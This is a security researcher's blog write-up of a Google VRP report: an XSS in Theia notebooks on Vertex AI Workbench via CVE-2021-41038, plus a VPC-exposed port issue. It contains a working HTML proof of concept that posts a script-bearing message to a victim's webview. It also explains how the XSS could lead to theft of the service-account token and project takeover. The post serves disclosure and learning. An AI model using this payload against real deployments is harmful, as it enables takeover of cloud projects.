+++
title = 'XSS using postMessage in Google Cloud Theia notebooks [Google VRP]'
date = 2023-01-15T20:12:33+05:30
+++

This write-up is a part of a series of write-ups about the bugs I and [Sivanesh](https://twitter.com/sivaneshashok) found in Google Cloud in 2022.  

While exploring Google Cloud’s Vertex AI Workbench, we noticed that we could create a workbench with Theia. Theia is the IDE that Google also uses in Cloud Shell. From reading previous research, we know that Theia implementations could be problematic.  

After deploying a Theia instance workbench, I noticed that the version was not the latest. So, I went Googling for known vulnerabilities. Although there were multiple known vulnerabilities in the installed version, not all of them were working. Either that specific feature was removed from the installation (e.g., mini-browser), or it would require unrealistic user interactions to exploit, like uploading a file and opening it themselves.  

However, it was not the case with [CVE-2021-41038](https://www.cvedetails.com/cve/CVE-2021-41038/). This bug exploits Theia's webview extension, which was enabled with our deployment. So, I went ahead and created a PoC:  

```html
<html>
  <body>
    <script>
      function exploit(){
        w = open("https://{VICTIM-SUBDOMAIN}-dot-us-west1.notebooks.googleusercontent.com/webview/index.html?id=a");
        window.setTimeout(function(){w.postMessage({channel: "content", args: {options: {allowScripts: true}, contents: "<img src=x onerror=\"document.write('XSS here! '+document.domain)\">"}}, "*");}, 5000);
      }
    </script>
    <button onclick="exploit()">Click here</button>
  </body>
</html>
```  

And sure enough, it worked, and the alert popped!  

When a user-managed Vertex AI Workbench is created, it uses the project's default compute engine service account. Since that service account has access to all the project resources, compromising it would allow an attacker to take complete control of the victim’s project.  

Hence, by using this XSS, an attacker could fetch the service account token from the metadata server and compromise the entire project.  

## Ways to obtain victim's instance subdomain:
1. By default, every person's subdomain is leaked to several third-party domains via referer. Some of those domains are:  

    1. https://open-vsx.org
    2. https://openvsxorg.blob.core.windows.net
    3. https://schemastore.azurewebsites.net  

2. Anyone with access to these domains or vulnerabilities in these servers can leak the subdomain  

## Reward:  
We reported this issue to Google as a part of their Vulnerability Reward Program. They awarded us with a $3133.70 bounty.  

## Bonus bug:  

Another behavior that we noticed in Theia was inspired by this [bug](https://mbrancato.github.io/2021/12/28/rce-dataflow.html), in which the researcher talks about how leaving a service unsecured in the internal cloud VPC could lead to security issues. To summarize, although the port is only open inside the VPC,  

1. An attacker with low privileges in the project could exploit such behavior to escalate privileges or move laterally.  
2. Admins tend to open port ranges to the internet for convenience.  

To understand how this affects Theia, let’s see how the authorization for Theia works. As mentioned above, the Theia instance was hosted on a subdomain of `notebooks.googleusercontent.com`. When users try to access this domain, they are redirected through an OAuth-like flow, where they are checked for permissions. If they have the necessary permissions, they would be redirected back to the notebook domain, and cookies get assigned.  

However, since port 8080, which Theia uses, is open inside the VPC, anyone inside the VPC could access it by directly using the IP address of the notebook instead of the domain. As explained above, since the notebooks contain the authorization token of the default compute engine service account, an attacker could easily use this to escalate privileges to the Project Editor level.  

Secondly, as stated above, it is common for admins to open port ranges to the internet for various reasons. Port 8080 is one of the most commonly opened ports.  

We reported this to Google VRP. However, they were already aware of this issue and were in the process of removing Theia from the list of options for Vertex AI Workbench.  

That ended up being the patch for both of these bugs. Theia was removed from Vertex AI Workbench.


